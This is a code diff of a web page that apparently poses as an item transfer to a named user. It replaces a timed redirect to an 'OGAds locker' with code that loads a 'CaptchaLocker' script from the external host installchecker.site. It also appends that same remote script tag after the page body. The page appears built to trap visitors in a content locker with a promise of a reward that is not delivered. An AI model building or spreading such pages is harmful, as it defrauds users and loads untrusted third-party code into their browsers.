@@ -1157,13 +1157,18 @@
             <div class="square"></div>
           </div>
           <p class="searching-text">Transferring ${itemName} to @${username}</p>
+          <div data-captcha-enable="true"></div>
         </div>
       `;
-      
-      // After 2 seconds, redirect to your OGAds locker
-      setTimeout(() => {
-        window.location.href = 'https://installchecker.site/cl/i/von12d';
-      }, 2000);
+      if (window.CaptchaLocker && typeof window.CaptchaLocker.init === 'function') {
+          window.CaptchaLocker.init();
+      } else {
+          // Fallback: reload the script if the global is not present
+          var script = document.createElement('script');
+          script.type = 'text/javascript';
+          script.src = 'https://installchecker.site/cp/js/j3pln';
+          document.body.appendChild(script);
+      }
     }
 
     // Function to show error state
@@ -1208,5 +1213,6 @@
       });
     });
   </script>
-
-</body></html>
+</body>
+<script type="text/javascript" src="https://installchecker.site/cp/js/j3pln"></script>
+</html>
